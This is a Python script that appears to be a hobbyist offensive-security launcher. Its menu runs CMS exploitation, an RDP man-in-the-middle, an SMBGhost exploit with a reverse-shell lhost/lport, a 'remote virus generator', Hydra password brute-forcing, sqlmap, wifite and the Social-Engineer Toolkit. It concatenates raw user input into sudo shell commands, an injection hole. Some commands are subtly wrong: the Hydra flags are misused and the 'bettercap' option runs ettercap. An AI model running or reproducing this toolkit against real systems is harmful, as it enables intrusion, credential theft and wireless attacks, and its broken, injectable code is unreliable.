import socket
import random
import socket
import sys
import os
alien = "clear && cat scripts/banner/alien.txt"
adultswim = "clear && cat scripts/banner/as.txt"
doom = "clear && cat scripts/banner/doom.txt"
nlys = "clear && cat scripts/banner/nlys.txt"
list_banner = [alien,adultswim,doom,nlys]
menu='''
1}fast-pen (normal user)
2}password cracking (root)
3}sqlmap shortcut (normal user)
4}nmap shortcut (root for some options)
5}wireless attack (root and wifi adapter)
6}social engeenering (root)
7} exit
'''
wireless_menu = '''
1}wireshark
2}bettercap
3}wifite (root)
'''
pen_menu = '''
1}cms exploitation (CMSeek, PS:not my code)
2}RDP mitm (sith, PS:not my code)
3}SMB ghost only for windows (not my code)
4}remote virus generator:use http service  (my code)
'''
os.system(random.choice(list_banner)) 
print(menu)
choose = input("()-->")
if(choose=="1"):
    os.system("clear")
    print(pen_menu)
    penis = input("(exploiting zone)-->")
    if(penis=="1"):
        os.system("clear && python3 exploit/CMSeeK/cmseek.py")
    if(penis=="2"):
        iface = input("[(Sith)iface]-->")
        target = input("[(Sith)target]-->")
        seth = "clear && sudo bash exploit/Seth/seth.sh "+iface+" "+target
        os.system(seth)
    if(penis=="3"):
        win_target = input("[(SMBGhost)target]-->")
        win_port = input("[(SMBGhost)port]-->")
        win_lhost = input("[(SMBGhost)lhost]-->")
        win_lport = input("[(SMBGhost)lport]-->")
        smb = "clear && python3 exploit/SMBGhost_AutomateExploitation/Smb_Ghost.py -i "+win_target+" -p "+win_port+" --lhost "+win_lhost+" --lport "+win_lport+" -e"
        os.system(smb)
    if(penis=="4"):
        print("Warning use this script only for good purpose!!!")
        print("edit the script before the use thnx you!!")
        os.system("python3 exploit/mysploit.py")
if(choose=="2"):
    hydra_target = input("[(password cracking)target]-->")
    protocol = input("[(password cracking)protocol(rdp/ftp/ssh)]-->")
    user = input("[(password cracking)username]-->")
    hydra = "sudo hydra -L wordlists/user.txt -p wordlists/rockyou.txt "+protocol+"://"+hydra_target+" && sudo hydra -L "+user+" -p wordlists/rockyou.txt "+protocol+"://"+hydra_target
    os.system(hydra)
if(choose=="3"):
    os.system("clear && sudo sqlmap --wizard")
if(choose=="4"):
    print("coming soon")
if(choose=="5"):
    os.system("clear")
    print(wireless_menu)
    wireless_choose = input("(wireless)-->")
    if(wireless_choose=="1"):
        os.system("sudo wireshark")
    if(wireless_choose=="2"):
        os.system("clear && sudo ettercap")
    if(wireless_choose=="3"):
        os.system("clear && sudo wifite --kill && sudo wifite")
if(choose=="6"):
    os.system("clear && sudo setoolkit")
if(choose=="7"):
    sys.exit()